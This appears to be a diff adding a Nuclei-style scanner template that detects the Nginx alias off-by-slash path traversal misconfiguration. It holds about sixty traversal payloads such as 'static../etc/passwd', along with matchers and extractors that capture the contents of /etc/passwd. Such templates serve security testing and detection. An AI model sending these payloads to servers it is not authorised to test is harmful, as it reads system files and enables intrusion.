@@ -1,0 +1,118 @@
+id: nginx-off-by-slash
+
+info:
+  name: Nginx Alias Off-By-Slash Path Traversal
+  author: p3i
+  severity: high
+  description: Detects the Nginx alias off-by-slash misconfiguration where a location block without a trailing slash maps to an alias with one (e.g. location /static -> alias /var/www/files/). Appending ../ to the location prefix traverses above the alias root and reads arbitrary server files.
+  tags: misconfig,nginx,path-traversal,alias,lfi,web
+  metadata:
+    max-request: 60
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{nginx_path}}"
+
+    payloads:
+      nginx_path:
+        - "static../etc/passwd"
+        - "static../../../etc/passwd"
+        - "assets../etc/passwd"
+        - "assets../../../etc/passwd"
+        - "public../etc/passwd"
+        - "public../../../etc/passwd"
+        - "files../etc/passwd"
+        - "files../../../etc/passwd"
+        - "uploads../etc/passwd"
+        - "uploads../../../etc/passwd"
+        - "media../etc/passwd"
+        - "media../../../etc/passwd"
+        - "images../etc/passwd"
+        - "images../../../etc/passwd"
+        - "img../etc/passwd"
+        - "img../../../etc/passwd"
+        - "css../etc/passwd"
+        - "css../../../etc/passwd"
+        - "js../etc/passwd"
+        - "js../../../etc/passwd"
+        - "dist../etc/passwd"
+        - "dist../../../etc/passwd"
+        - "build../etc/passwd"
+        - "build../../../etc/passwd"
+        - "vendor../etc/passwd"
+        - "vendor../../../etc/passwd"
+        - "node_modules../etc/passwd"
+        - "resource../etc/passwd"
+        - "resources../etc/passwd"
+        - "download../etc/passwd"
+        - "downloads../etc/passwd"
+        - "storage../etc/passwd"
+        - "data../etc/passwd"
+        - "content../etc/passwd"
+        - "cdn../etc/passwd"
+        - "api../etc/passwd"
+        - "v1../etc/passwd"
+        - "v2../etc/passwd"
+        - "app../etc/passwd"
+        - "web../etc/passwd"
+        - "www../etc/passwd"
+        - "html../etc/passwd"
+        - "src../etc/passwd"
+        - "lib../etc/passwd"
+        - "tmp../etc/passwd"
+        - "cache../etc/passwd"
+        - "backup../etc/passwd"
+        - "private../etc/passwd"
+        - "secure../etc/passwd"
+        - "shared../etc/passwd"
+        - "include../etc/passwd"
+        - "conf../etc/passwd"
+        - "config../etc/passwd"
+        - "templates../etc/passwd"
+        - "views../etc/passwd"
+        - "layouts../etc/passwd"
+        - "components../etc/passwd"
+        - "fonts../etc/passwd"
+        - "icons../etc/passwd"
+        - "docs../etc/passwd"
+        - "swagger../etc/passwd"
+
+    attack: batteringram
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "root:x:0:0:"
+          - "root:0:0:"
+          - "bin:x:1:1:"
+          - "daemon:x:"
+          - "nobody:x:"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "/home/"
+          - "/usr/sbin"
+
+      - type: dsl
+        dsl:
+          - "len(body) > 20"
+          - "!contains(tolower(header), 'content-type: text/html')"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?im)^([a-zA-Z_][a-zA-Z0-9_-]*:x:[0-9]+:[0-9]+:[^\\r\\n]*)"
+          - "(?im)^([a-zA-Z_][a-zA-Z0-9_-]*:[^:]+:[0-9]+:[0-9]+:[^\\r\\n]*)"
+      - type: dsl
+        name: status
+        dsl:
+          - "status_code"
